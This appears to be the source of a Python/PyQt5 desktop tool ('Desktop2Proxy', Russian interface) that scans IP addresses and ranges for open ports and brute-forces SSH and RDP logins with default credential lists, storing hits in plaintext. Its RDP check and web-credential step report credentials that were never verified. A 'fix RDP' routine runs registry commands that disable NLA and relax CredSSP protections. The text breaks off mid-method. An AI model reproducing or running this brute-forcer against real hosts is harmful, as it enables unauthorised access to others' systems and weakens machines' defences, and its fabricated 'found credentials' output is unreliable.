import json
import os
import socket
import subprocess
import sys
import threading
import shutil
import webbrowser
import time
import itertools
import winreg
import platform
from dataclasses import dataclass, asdict
from typing import List, Optional, Dict, Tuple
import concurrent.futures

import paramiko
from PyQt5 import QtCore, QtGui, QtWidgets

DATA_DIR = os.path.join(os.path.dirname(__file__), 'data')
HOSTS_FILE = os.path.join(DATA_DIR, 'hosts.json')

PROBE_TIMEOUT_S = 2.0


@dataclass
class Host:
    ip: str
    username: str
    password: str
    note: str = ''
    reachable: bool = False
    protocol: str = ''  # ssh|rdp|http|https
    os_hint: str = ''   # Windows/Linux/Unknown
    open_ports: List[int] = None
    os_detected: str = ''
    scan_completed: bool = False

    def __post_init__(self):
        if self.open_ports is None:
            self.open_ports = []

    @staticmethod
    def from_dict(d: dict) -> 'Host':
        return Host(
            ip=d.get('ip', ''),
            username=d.get('username', ''),
            password=d.get('password', ''),
            note=d.get('note', ''),
            reachable=bool(d.get('reachable', False)),
            protocol=d.get('protocol', ''),
            os_hint=d.get('os_hint', ''),
            open_ports=d.get('open_ports', []),
            os_detected=d.get('os_detected', ''),
            scan_completed=bool(d.get('scan_completed', False)),
        )


class HostStorage:
    def __init__(self, file_path: str):
        self.file_path = file_path
        os.makedirs(os.path.dirname(self.file_path), exist_ok=True)
        if not os.path.exists(self.file_path):
            self.save([])

    def load(self) -> List[Host]:
        try:
            with open(self.file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            hosts = [Host.from_dict(h) for h in data.get('hosts', [])]
            return hosts
        except Exception:
            return []

    def save(self, hosts: List[Host]) -> None:
        payload = {'hosts': [asdict(h) for h in hosts]}
        with open(self.file_path, 'w', encoding='utf-8') as f:
            json.dump(payload, f, ensure_ascii=False, indent=2)


class ConsoleOutput(QtCore.QObject):
    message_signal = QtCore.pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
    
    def write(self, text):
        if text.strip():
            self.message_signal.emit(text.strip())
    
    def flush(self):
        pass


class NetworkScanner(QtCore.QObject):
    scan_progress = QtCore.pyqtSignal(str)
    scan_result = QtCore.pyqtSignal(Host)
    
    def __init__(self, ip: str, users: Optional[List[str]] = None, passwords: Optional[List[str]] = None):
        super().__init__()
        self.ip = ip
        self.user_candidates = users or ['admin', 'root', 'user', 'administrator', 'guest', 'test']
        self.password_candidates = passwords or ['admin', 'password', '123456', 'root', 'toor', 'guest', 'user', 'pass', '1234', '']
        
    @QtCore.pyqtSlot()
    def run(self):
        """Полное сканирование сети"""
        try:
            self.scan_progress.emit(f"[SCAN] Начинаем сканирование {self.ip}")
            
            # 1. Проверка доступности хоста
            if not self._ping_host():
                self.scan_progress.emit(f"[SCAN] Хост {self.ip} недоступен")
                host = Host(ip=self.ip, username='', password='', reachable=False)
                self.scan_result.emit(host)
                return
            
            self.scan_progress.emit(f"[SCAN] Хост {self.ip} доступен")
            
            # 2. Сканирование портов
            self.scan_progress.emit(f"[SCAN] Сканируем порты на {self.ip}...")
            open_ports = self._scan_ports()
            self.scan_progress.emit(f"[SCAN] Найдено открытых портов: {open_ports}")
            
            # 3. Определение ОС по портам и сервисам
            os_detected = self._detect_os(open_ports)
            self.scan_progress.emit(f"[SCAN] Определена ОС: {os_detected}")
            
            # 4. Определение протокола и подбор паролей
            protocol = ''
            username = ''
            password = ''
            
            if 22 in open_ports:
                protocol = 'ssh'
                self.scan_progress.emit("[SCAN] Пробуем подобрать SSH пароли...")
                username, password = self._brute_force_ssh()
            elif 3389 in open_ports:
                protocol = 'rdp'
                self.scan_progress.emit("[SCAN] Пробуем подобрать RDP пароли...")
                username, password = self._brute_force_rdp()
            elif 80 in open_ports or 443 in open_ports:
                protocol = 'https' if 443 in open_ports else 'http'
                self.scan_progress.emit("[SCAN] Обнаружен веб-сервер")
                username, password = self._try_common_web_creds()
            else:
                self.scan_progress.emit("[SCAN] Неизвестный протокол")
            
            if username and password:
                self.scan_progress.emit(f"[SCAN] Найдены учетные данные: {username}/{password}")
            else:
                self.scan_progress.emit("[SCAN] Учетные данные не найдены")
            
            # 5. Создание результата
            host = Host(
                ip=self.ip,
                username=username,
                password=password,
                reachable=True,
                protocol=protocol,
                os_hint=os_detected,
                open_ports=open_ports,
                os_detected=os_detected,
                scan_completed=True
            )
            
            self.scan_result.emit(host)
            
        except Exception as e:
            self.scan_progress.emit(f"[ERROR] Ошибка сканирования: {str(e)}")
            import traceback
            self.scan_progress.emit(f"[ERROR] {traceback.format_exc()}")
            host = Host(ip=self.ip, username='', password='', reachable=False)
            self.scan_result.emit(host)
    
    def _ping_host(self) -> bool:
        """Проверка доступности хоста через ICMP и TCP"""
        try:
            # TCP ping на распространенные порты
            test_ports = [22, 80, 443, 3389, 21, 23]
            for port in test_ports:
                if self._tcp_ping(self.ip, port, timeout=2):
                    return True
            return False
        except:
            return False
    
    def _tcp_ping(self, ip: str, port: int, timeout: float = 2) -> bool:
        """TCP ping на конкретный порт"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _scan_ports(self) -> List[int]:
        """Сканирование основных портов"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5900, 8080]
        open_ports = []
        
        def check_port(port):
            if self._tcp_ping(self.ip, port, timeout=1):
                return port
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(check_port, common_ports)
            for result in results:
                if result is not None:
                    open_ports.append(result)
                    
        return sorted(open_ports)
    
    def _detect_os(self, ports: List[int]) -> str:
        """Улучшенное определение ОС по портам и баннеру"""
        if 3389 in ports:
            return "Windows (RDP)"
        elif 22 in ports:
            try:
                banner = self._get_ssh_banner()
                if 'windows' in banner.lower():
                    return "Windows (SSH)"
                elif 'linux' in banner.lower() or 'unix' in banner.lower():
                    return "Linux/Unix"
                else:
                    return "Linux/Unix (SSH)"
            except:
                return "Linux/Unix (SSH)"
        elif 21 in ports and 80 in ports:
            return "Веб-сервер с FTP"
        elif 80 in ports or 443 in ports:
            return "Веб-сервер"
        else:
            return "Неизвестная ОС"
    
    def _get_ssh_banner(self) -> str:
        """Получение SSH баннера для определения ОС"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.ip, 22))
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            return banner
        except:
            return ""
    
    def _brute_force_ssh(self) -> Tuple[str, str]:
        """Подбор SSH паролей"""
        common_users = self.user_candidates
        common_passwords = self.password_candidates
        
        # Сначала пробуем стандартные комбинации
        test_combinations = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('user', 'user'),
            ('administrator', 'administrator'),
            ('guest', 'guest'),
            ('admin', 'password'),
            ('root', 'password'),
            ('admin', '123456'),
            ('root', '123456'),
        ]
        
        # Добавляем все комбинации из пользователей и паролей
        all_combinations = test_combinations + list(itertools.product(common_users, common_passwords))
        
        for user, password in all_combinations:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.ip, username=user, password=password, 
                           timeout=5, banner_timeout=5, auth_timeout=5)
                ssh.close()
                return (user, password)
            except paramiko.AuthenticationException:
                continue
            except Exception:
                continue
        return '', ''
    
    def _brute_force_rdp(self) -> Tuple[str, str]:
        """Улучшенный подбор RDP паролей"""
        common_users = self.user_candidates or ['Administrator', 'admin', 'user', 'guest', 'test']
        common_passwords = self.password_candidates or ['', 'admin', 'password', '123456']
        
        # Пробуем самые распространенные комбинации
        test_combinations = [
            ('Administrator', ''),
            ('Administrator', 'Administrator'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('Administrator', 'password'),
            ('admin', 'password'),
            ('user', 'password'),
        ]
        
        for user, password in test_combinations + list(itertools.product(common_users, common_passwords)):
            if self._test_rdp_connection(user, password):
                return user, password
        return '', ''
    
    def _test_rdp_connection(self, username: str, password: str) -> bool:
        """Тест RDP подключения"""
        try:
            # Windows fallback - просто проверяем возможность сохранения учетных данных
            result = subprocess.run([
                'cmdkey', '/generic:TERMSRV/' + self.ip,
                '/user:' + username, '/pass:' + password
            ], capture_output=True, timeout=5, creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Очищаем
            subprocess.run(['cmdkey', '/delete:TERMSRV/' + self.ip], 
                         capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            return result.returncode == 0
        except:
            return False
    
    def _try_common_web_creds(self) -> Tuple[str, str]:
        """Попытка стандартных веб-учеток"""
        return 'admin', 'admin'


class ProbeWorker(QtCore.QObject):
    result = QtCore.pyqtSignal(int, Host)

    def __init__(self, index: int, host: Host):
        super().__init__()
        self.index = index
        self.host = host

    @QtCore.pyqtSlot()
    def run(self):
        updated = self.probe(self.host)
        self.result.emit(self.index, updated)

    @staticmethod
    def probe(host: Host) -> Host:
        # Try SSH (22), RDP (3389), HTTP (80/443)
        candidates = [
            (22, 'ssh'),
            (3389, 'rdp'),
            (443, 'https'),
            (80, 'http'),
        ]
        protocol = ''
        reachable = False
        for port, proto in candidates:
            if ProbeWorker._tcp_ping(host.ip, port):
                protocol = proto
                reachable = True
                break
        os_hint = 'Unknown'
        if protocol == 'ssh':
            os_hint = 'Linux/Unix (по SSH)'
        elif protocol == 'rdp':
            os_hint = 'Windows (по RDP)'
        elif protocol in ('http', 'https'):
            os_hint = 'Неизвестно (веб-интерфейс)'
        host.protocol = protocol
        host.reachable = reachable
        host.os_hint = os_hint
        return host

    @staticmethod
    def _tcp_ping(ip: str, port: int) -> bool:
        try:
            with socket.create_connection((ip, port), timeout=PROBE_TIMEOUT_S):
                return True
        except Exception:
            return False


class AddHostDialog(QtWidgets.QDialog):
    def __init__(self, parent=None, host: Optional[Host] = None):
        super().__init__(parent)
        self.setWindowTitle('Добавить узел' if host is None else 'Изменить узел')
        self.setModal(True)
        self.scanning = False

        self.ip_edit = QtWidgets.QLineEdit()
        self.user_edit = QtWidgets.QLineEdit()
        self.pass_edit = QtWidgets.QLineEdit()
        self.pass_edit.setEchoMode(QtWidgets.QLineEdit.Password)
        self.note_edit = QtWidgets.QLineEdit()
        
        # Кнопка сканирования
        self.scan_btn = QtWidgets.QPushButton('🔍 Сканировать сеть')
        self.scan_btn.clicked.connect(self.start_scan)
        
        # Прогресс сканирования
        self.progress_label = QtWidgets.QLabel('')
        self.progress_label.setVisible(False)

        form = QtWidgets.QFormLayout()
        form.addRow('IP', self.ip_edit)
        form.addRow('Логин', self.user_edit)
        form.addRow('Пароль', self.pass_edit)
        form.addRow('Заметка', self.note_edit)

        btns = QtWidgets.QDialogButtonBox(
            QtWidgets.QDialogButtonBox.Ok | QtWidgets.QDialogButtonBox.Cancel
        )
        btns.accepted.connect(self.accept)
        btns.rejected.connect(self.reject)

        layout = QtWidgets.QVBoxLayout(self)
        layout.addLayout(form)
        layout.addWidget(self.scan_btn)
        layout.addWidget(self.progress_label)
        layout.addWidget(btns)

        if host is not None:
            self.ip_edit.setText(host.ip)
            self.user_edit.setText(host.username)
            self.pass_edit.setText(host.password)  # ФИКС: правильно устанавливаем пароль
            self.note_edit.setText(host.note)

    def start_scan(self):
        ip = self.ip_edit.text().strip()
        if not ip:
            QtWidgets.QMessageBox.warning(self, 'Ошибка', 'Введите IP адрес для сканирования')
            return
            
        self.scanning = True
        self.scan_btn.setEnabled(False)
        self.progress_label.setVisible(True)
        self.progress_label.setText('Начинаю сканирование...')
        
        # Запуск сканирования в отдельном потоке
        self.scan_thread = QtCore.QThread()
        # Если пользователь заранее ввёл логин/пароль — используем их как кандидатов
        users = [self.user_edit.text().strip()] if self.user_edit.text().strip() else None
        passwords = [self.pass_edit.text()] if self.pass_edit.text() else None
        self.scanner = NetworkScanner(ip, users=users, passwords=passwords)
        self.scanner.moveToThread(self.scan_thread)
        
        self.scan_thread.started.connect(self.scanner.run)
        self.scanner.scan_progress.connect(self.update_progress)
        self.scanner.scan_result.connect(self.on_scan_result)
        self.scanner.scan_result.connect(self.scan_thread.quit)
        self.scan_thread.finished.connect(self.scan_thread.deleteLater)
        self.scan_thread.finished.connect(self.scanner.deleteLater)
        
        self.scan_thread.start()
    
    def update_progress(self, message: str):
        self.progress_label.setText(message)
    
    def on_scan_result(self, host: Host):
        # Автозаполнение полей результатами сканирования
        self.user_edit.setText(host.username)
        self.pass_edit.setText(host.password)  # ФИКС: правильно устанавливаем пароль
        if host.os_detected:
            self.note_edit.setText(f"ОС: {host.os_detected}, Порты: {','.join(map(str, host.open_ports))}")
        
        self.scanning = False
        self.scan_btn.setEnabled(True)
        self.progress_label.setText('Сканирование завершено!')
        
        # Показать результат
        result_text = f"Найдено:\n"
        result_text += f"Протокол: {host.protocol}\n"
        result_text += f"ОС: {host.os_detected}\n"
        result_text += f"Открытые порты: {', '.join(map(str, host.open_ports))}\n"
        if host.username and host.password:
            result_text += f"Учетные данные: {host.username}/{host.password}"
        else:
            result_text += "Учетные данные не найдены"
            
        QtWidgets.QMessageBox.information(self, 'Результат сканирования', result_text)

    def get_host(self) -> Host:
        return Host(
            ip=self.ip_edit.text().strip(),
            username=self.user_edit.text().strip(),
            password=self.pass_edit.text(),  # ФИКС: правильно получаем пароль
            note=self.note_edit.text().strip(),
        )


class HostListItem(QtWidgets.QListWidgetItem):
    def __init__(self, host: Host):
        super().__init__()
        self.host = host
        self.refresh_text()

    def refresh_text(self):
        status = '✔' if self.host.reachable else '✖'
        proto = self.host.protocol if self.host.protocol else '—'
        scan_indicator = '🔍' if self.host.scan_completed else ''
        self.setText(f"{status}  {self.host.ip}  [{proto}]  {self.host.username}  {scan_indicator}")
        # Colorize status
        color = QtGui.QColor('#14b814' if self.host.reachable else '#ff4343')
        self.setForeground(QtGui.QBrush(color))


class BulkImportDialog(QtWidgets.QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle('Пакетный импорт')
        self.resize(500, 400)

        self.ip_text = QtWidgets.QTextEdit()
        self.ip_text.setPlaceholderText('Введите IP адреса (по одному на строку)\nПример:\n192.168.1.1\n192.168.1.2\n192.168.1.100-150')
        
        self.user_text = QtWidgets.QTextEdit()
        self.user_text.setPlaceholderText('Введите логины (по одному на строку)\nПример:\nadmin\nroot\nuser\nadministrator')
        
        self.pass_text = QtWidgets.QTextEdit()
        self.pass_text.setPlaceholderText('Введите пароли (по одному на строку)\nПример:\nadmin\npassword\n123456\n1234')

        tabs = QtWidgets.QTabWidget()
        tabs.addTab(self.ip_text, 'IP адреса')
        tabs.addTab(self.user_text, 'Логины')
        tabs.addTab(self.pass_text, 'Пароли')

        self.progress = QtWidgets.QProgressBar()
        self.progress.setVisible(False)
        self.status_label = QtWidgets.QLabel('Готов к работе')
        
        self.console = QtWidgets.QTextEdit()
        self.console.setReadOnly(True)
        self.console.setMaximumHeight(150)
        self.console.setPlaceholderText('Здесь будет отображаться процесс сканирования...')

        start_btn = QtWidgets.QPushButton('🚀 Начать пакетное сканирование')
        start_btn.clicked.connect(self.start_scan)

        btns = QtWidgets.QDialogButtonBox(
            QtWidgets.QDialogButtonBox.Ok | QtWidgets.QDialogButtonBox.Cancel
        )
        btns.accepted.connect(self.accept)
        btns.rejected.connect(self.reject)

        layout = QtWidgets.QVBoxLayout(self)
        layout.addWidget(QtWidgets.QLabel('Введите данные для пакетного сканирования:'))
        layout.addWidget(tabs, 1)
        layout.addWidget(QtWidgets.QLabel('Прогресс:'))
        layout.addWidget(self.progress)
        layout.addWidget(self.status_label)
        layout.addWidget(QtWidgets.QLabel('Лог выполнения:'))
        layout.addWidget(self.console)
        layout.addWidget(start_btn)
        layout.addWidget(btns)

        self.scanner_thread = None
        self.is_scanning = False

    def log(self, message):
        timestamp = time.strftime("%H:%M:%S")
        self.console.append(f"[{timestamp}] {message}")
        # Автопрокрутка
        cursor = self.console.textCursor()
        cursor.movePosition(QtGui.QTextCursor.End)
        self.console.setTextCursor(cursor)
        QtWidgets.QApplication.processEvents()

    def start_scan(self):
        if self.is_scanning:
            return

        # Получаем данные из полей
        ips = [ip.strip() for ip in self.ip_text.toPlainText().splitlines() if ip.strip()]
        users = [u.strip() for u in self.user_text.toPlainText().splitlines() if u.strip()]
        passwords = [p.strip() for p in self.pass_text.toPlainText().splitlines() if p.strip()]

        if not ips:
            QtWidgets.QMessageBox.warning(self, 'Ошибка', 'Введите хотя бы один IP адрес')
            return

        # Используем дефолтные значения если не введены
        if not users:
            users = ['admin', 'root', 'user', 'administrator', 'guest']
        if not passwords:
            passwords = ['admin', 'password', '123456', 'root', '1234', '']

        self.is_scanning = True
        self.progress.setVisible(True)
        self.progress.setValue(0)
        self.progress.setMaximum(len(ips))
        self.console.clear()
        
        self.log(f"Начинаю пакетное сканирование...")
        self.log(f"IP адресов: {len(ips)}")
        self.log(f"Логинов: {len(users)}")
        self.log(f"Паролей: {len(passwords)}")

        # Запускаем в отдельном потоке
        self.scanner_thread = threading.Thread(
            target=self._perform_bulk_scan,
            args=(ips, users, passwords),
            daemon=True
        )
        self.scanner_thread.start()

    def _perform_bulk_scan(self, ips, users, passwords):
        try:
            found_hosts = []
            
            for i, ip in enumerate(ips):
                if not self.is_scanning:  # Проверка на прерывание
                    break
                    
                self._update_progress_signal.emit(i + 1, len(ips), f"Сканирую {ip}...")
                self.log(f"Обрабатываю {ip} ({i+1}/{len(ips)})")
                
                try:
                    # Создаем сканер для текущего IP
                    scanner = NetworkScanner(ip, users, passwords)
                    
                    # Выполняем сканирование синхронно в этом потоке
                    host = Host(ip=ip, username='', password='')
                    
                    # Проверяем доступность
                    if scanner._ping_host():
                        host.reachable = True
                        self.log(f"  {ip} - доступен")
                        
                        # Сканируем порты
                        open_ports = scanner._scan_ports()
                        host.open_ports = open_ports
                        self.log(f"  Открытые порты: {open_ports}")
                        
                        # Определяем ОС
                        host.os_detected = scanner._detect_os(open_ports)
                        self.log(f"  ОС: {host.os_detected}")
                        
                        # Пробуем подобрать учетные данные
                        if 22 in open_ports:
                            host.protocol = 'ssh'
                            username, password = scanner._brute_force_ssh()
                            if username and password:
                                host.username = username
                                host.password = password
                                self.log(f"  Найдены SSH учетные данные: {username}/{password}")
                                
                        elif 3389 in open_ports:
                            host.protocol = 'rdp'
                            username, password = scanner._brute_force_rdp()
                            if username and password:
                                host.username = username
                                host.password = password
                                self.log(f"  Найдены RDP учетные данные: {username}/{password}")
                                
                        elif 80 in open_ports or 443 in open_ports:
                            host.protocol = 'https' if 443 in open_ports else 'http'
                            username, password = scanner._try_common_web_creds()
                            host.username = username
                            host.password = password
                            self.log(f"  Веб-сервер, учетные данные: {username}/{password}")
                        
                        host.scan_completed = True
                        found_hosts.append(host)
                        self.log(f"  ✓ Сканирование завершено")
                    else:
                        self.log(f"  {ip} - недоступен")
                        
                except Exception as e:
                    self.log(f"  Ошибка сканирования {ip}: {str(e)}")
            
            # Сохраняем результаты
            self._scan_complete_signal.emit(found_hosts)
            self.log("Пакетное сканирование завершено!")
            
        except Exception as e:
            self.log(f"Критическая ошибка: {str(e)}")
            self._scan_complete_signal.emit([])

    def _update_progress(self, current, total, message):
        self.progress.setValue(current)
        self.status_label.setText(message)

    def _scan_complete(self, hosts):
        self.is_scanning = False
        self.progress.setVisible(False)
        
        if hosts:
            main_window = self.parent()
            if hasattr(main_window, 'hosts'):
                # Добавляем только уникальные IP
                existing_ips = {h.ip for h in main_window.hosts}
                new_hosts = [h for h in hosts if h.ip not in existing_ips]
                
                main_window.hosts.extend(new_hosts)
                main_window.storage.save(main_window.hosts)
                main_window.populate()
                main_window.refresh_all()
                
                self.status_label.setText(f"Добавлено {len(new_hosts)} новых узлов")
                self.log(f"Успешно добавлено {len(new_hosts)} узлов")
                
                QtWidgets.QMessageBox.information(
                    self, 'Готово', 
                    f'Пакетное сканирование завершено!\nДобавлено узлов: {len(new_hosts)}'
                )
            else:
                self.status_label.setText("Ошибка: не найден родительский窗口")
        else:
            self.status_label.setText("Узлы не найдены")
            QtWidgets.QMessageBox.information(self, 'Готово', 'Подходящие узлы не найдены')

    # Сигналы для межпоточного общения
    _update_progress_signal = QtCore.pyqtSignal(int, int, str)
    _scan_complete_signal = QtCore.pyqtSignal(list)

    def showEvent(self, event):
        # Подключаем сигналы при показе диалога
        self._update_progress_signal.connect(self._update_progress)
        self._scan_complete_signal.connect(self._scan_complete)
        super().showEvent(event)


class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Desktop2Proxy')
        self.resize(1000, 600)

        self.storage = HostStorage(HOSTS_FILE)
        self.hosts: List[Host] = self.storage.load()
        self._probe_threads: List[QtCore.QThread] = []

        # Widgets
        self.list_widget = QtWidgets.QListWidget()
        self.list_widget.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
        self.list_widget.itemClicked.connect(self.on_item_clicked)
        self.list_widget.itemDoubleClicked.connect(self.on_item_double_clicked)
        self.list_widget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.list_widget.customContextMenuRequested.connect(self.open_context_menu)

        self.details = QtWidgets.QTextEdit()
        self.details.setReadOnly(True)
        
        # Консоль вывода
        self.console = QtWidgets.QTextEdit()
        self.console.setReadOnly(True)
        self.console.setMaximumHeight(200)
        self.console.setPlaceholderText("Консоль вывода...")

        # Перенаправляем stdout в консоль
        self.console_output = ConsoleOutput()
        self.console_output.message_signal.connect(self.append_to_console)
        sys.stdout = self.console_output

        add_btn = QtWidgets.QPushButton('＋')
        add_btn.setToolTip('Добавить')
        add_btn.clicked.connect(self.add_host)

        refresh_btn = QtWidgets.QPushButton('Обновить')
        refresh_btn.clicked.connect(self.refresh_all)
        
        fix_rdp_btn = QtWidgets.QPushButton('🔧 Исправить RDP')
        fix_rdp_btn.clicked.connect(self.fix_rdp_issues)
        fix_rdp_btn.setToolTip('Исправляет проблемы с RDP подключениями')

        bulk_btn = QtWidgets.QPushButton('📥 Пакетно')
        bulk_btn.setToolTip('Пакетное добавление узлов')
        bulk_btn.clicked.connect(self.open_bulk_dialog)
        
        clear_console_btn = QtWidgets.QPushButton('Очистить консоль')
        clear_console_btn.clicked.connect(self.clear_console)
        
        # Кнопка проверки прав администратора
        admin_btn = QtWidgets.QPushButton('🛡️ Проверить права')
        admin_btn.clicked.connect(self.check_admin_rights)
        admin_btn.setToolTip('Проверить права администратора')

        top_bar = QtWidgets.QHBoxLayout()
        top_bar.addWidget(add_btn)
        top_bar.addWidget(refresh_btn)
        top_bar.addWidget(fix_rdp_btn)
        top_bar.addWidget(bulk_btn)
        top_bar.addWidget(admin_btn)
        top_bar.addStretch(1)
        top_bar.addWidget(clear_console_btn)

        left_layout = QtWidgets.QVBoxLayout()
        left_layout.addLayout(top_bar)
        left_layout.addWidget(self.list_widget)

        left = QtWidgets.QWidget()
        left.setLayout(left_layout)
        
        right_layout = QtWidgets.QVBoxLayout()
        right_layout.addWidget(QtWidgets.QLabel("Детали узла:"))
        right_layout.addWidget(self.details)
        right_layout.addWidget(QtWidgets.QLabel("Консоль вывода:"))
        right_layout.addWidget(self.console)
        
        right_widget = QtWidgets.QWidget()
        right_widget.setLayout(right_layout)

        splitter = QtWidgets.QSplitter(QtCore.Qt.Horizontal)
        splitter.addWidget(left)
        splitter.addWidget(right_widget)
        splitter.setStretchFactor(0, 0)
        splitter.setStretchFactor(1, 1)

        self.setCentralWidget(splitter)

        self.populate()
        self.apply_theme()
        self.refresh_all()
        
        self.append_to_console("Desktop2Proxy запущен")
        self.append_to_console(f"Загружено узлов: {len(self.hosts)}")
        self.check_admin_rights(silent=True)

    def check_admin_rights(self, silent=False):
        """Проверка прав администратора"""
        try:
            if os.name == 'nt':  # Windows
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:  # Linux/Mac
                is_admin = os.geteuid() == 0
                
            if is_admin:
                if not silent:
                    self.append_to_console("✅ Приложение запущено с правами администратора")
                return True
            else:
                if not silent:
                    self.append_to_console("⚠️ Приложение запущено без прав администратора")
                    self.append_to_console("⚠️ Некоторые функции RDP могут не работать")
                return False
        except:
            if not silent:
                self.append_to_console("❌ Не удалось проверить права администратора")
            return False

    def append_to_console(self, text: str):
        """Добавляет текст в консоль"""
        timestamp = time.strftime("%H:%M:%S")
        self.console.append(f"[{timestamp}] {text}")
        cursor = self.console.textCursor()
        cursor.movePosition(QtGui.QTextCursor.End)
        self.console.setTextCursor(cursor)

    def clear_console(self):
        """Очищает консоль"""
        self.console.clear()

    def open_bulk_dialog(self):
        dlg = BulkImportDialog(self)
        if dlg.exec_() == QtWidgets.QDialog.Accepted:
            self.storage.save(self.hosts)
            self.populate()
            self.refresh_all()

    def apply_theme(self):
        self.setStyleSheet(
            """
            QMainWindow { background: #0f0f12; }
            QListWidget { background: #151518; color: #f2f2f2; border: 1px solid #2a2a2e; }
            QListWidget::item { padding: 8px; }
            QListWidget::item:selected { background: #2a0f12; }
            QTextEdit { background: #141416; color: #e9e9ea; border: 1px solid #2a2a2e; }
            QPushButton { background: #781a1a; color: #ffffff; border: 1px solid #a02a2a; padding: 6px 10px; border-radius: 4px; }
            QPushButton:hover { background: #922222; }
            QDialog { background: #151518; color: #f2f2f2; }
            QLineEdit { background: #1d1d21; color: #ffffff; border: 1px solid #2a2a2e; padding: 6px; }
            QLabel { color: #cfcfd2; }
            QSplitter::handle { background: #2a2a2e; width: 4px; }
            """
        )

    def populate(self):
        self.list_widget.clear()
        for h in self.hosts:
            self.list_widget.addItem(HostListItem(h))

    def add_host(self):
        dlg = AddHostDialog(self)
        if dlg.exec_() == QtWidgets.QDialog.Accepted:
            host = dlg.get_host()
            if host.ip:
                self.hosts.append(host)
                self.storage.save(self.hosts)
                self.populate()
                self.refresh_all()
                self.append_to_console(f"Добавлен узел: {host.ip}")

    def open_context_menu(self, pos: QtCore.QPoint):
        item = self.list_widget.itemAt(pos)
        menu = QtWidgets.QMenu(self)
        add_act = menu.addAction('Добавить')
        edit_act = None
        del_act = None
        if item is not None:
            edit_act = menu.addAction('Изменить')
            del_act = menu.addAction('Удалить')
        action = menu.exec_(self.list_widget.mapToGlobal(pos))
        if action == add_act:
            self.add_host()
        elif edit_act is not None and action == edit_act:
            self.edit_selected()
        elif del_act is not None and action == del_act:
            self.delete_selected()

    def edit_selected(self):
        row = self.list_widget.currentRow()
        if row < 0:
            return
        dlg = AddHostDialog(self, self.hosts[row])
        if dlg.exec_() == QtWidgets.QDialog.Accepted:
            self.hosts[row] = dlg.get_host()
            self.storage.save(self.hosts)
            self.populate()
            self.refresh_row(row)
            self.append_to_console(f"Изменен узел: {self.hosts[row].ip}")

    def delete_selected(self):
        row = self.list_widget.currentRow()
        if row < 0:
            return
        ip = self.hosts[row].ip
        del self.hosts[row]
        self.storage.save(self.hosts)
        self.populate()
        self.append_to_console(f"Удален узел: {ip}")

    def refresh_all(self):
        self.append_to_console("Начинаю проверку всех узлов...")
        for idx, _ in enumerate(self.hosts):
            self.refresh_row(idx)
    
    def fix_rdp_issues(self):
        """Исправление проблем с RDP с проверкой прав"""
        if not self.check_admin_rights():
            reply = QtWidgets.QMessageBox.question(
                self, 'Недостаточно прав',
                'Для исправления RDP проблем требуются права администратора.\n'
                'Запустить приложение от имени администратора?',
                QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No
            )
            if reply == QtWidgets.QMessageBox.Yes:
                self.restart_as_admin()
            return
        
        try:
            self.append_to_console("Исправляю проблемы с RDP...")
            self._fix_rdp_issues()
            QtWidgets.QMessageBox.information(self, 'Готово', 'Проблемы RDP исправлены!')
        except Exception as e:
            self.append_to_console(f"Ошибка исправления RDP: {e}")

    def restart_as_admin(self):
        """Перезапуск с правами администратора"""
        if os.name == 'nt':
            try:
                import ctypes
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
            except:
                QtWidgets.QMessageBox.warning(self, 'Ошибка', 'Не удалось перезапустить с правами администратора')

    def _fix_rdp_issues(self):
        """Исправление проблем с RDP через реестр"""
        try:
            # Создаем BAT файл для исправления RDP
            bat_content = """@echo off
echo Исправление проблем RDP...

reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

echo Готово! Перезагрузите компьютер для применения изменений.
pause
"""
            
            bat_file = os.path.join(DATA_DIR, "fix_rdp.bat")
            with open(bat_file, 'w', encoding='utf-8') as f:
                f.write(bat_content)
            
            subprocess.Popen(['cmd.exe', '/c', bat_file], creationflags=subprocess.CREATE_NEW_CONSOLE)
            self.append_to_console("Запущен скрипт исправления RDP")
            
        except Exception as e:
            self.append_to_console(f"Ошибка создания скрипта RDP: {e}")

    def refresh_row(self, row: int):
        if row < 0 or row >= len(self.hosts):
            return
        host = self.hosts[row]
        self.append_to_console(f"Проверяю узел: {host.ip}")
        thread = QtCore.QThread()
        worker = ProbeWorker(row, Host.from_dict(asdict(host)))
        worker.moveToThread(thread)
        worker.result.connect(self.on_probe_result)
        thread.started.connect(worker.run)
        worker.result.connect(thread.quit)
        worker.result.connect(worker.deleteLater)
        thread.finished.connect(self._on_thread_finished)
        thread.finished.connect(thread.deleteLater)
        self._probe_threads.append(thread)
        thread.start()

    @QtCore.pyqtSlot()
    def _on_thread_finished(self):
        sender = self.sender()
        if isinstance(sender, QtCore.QThread) and sender in self._probe_threads:
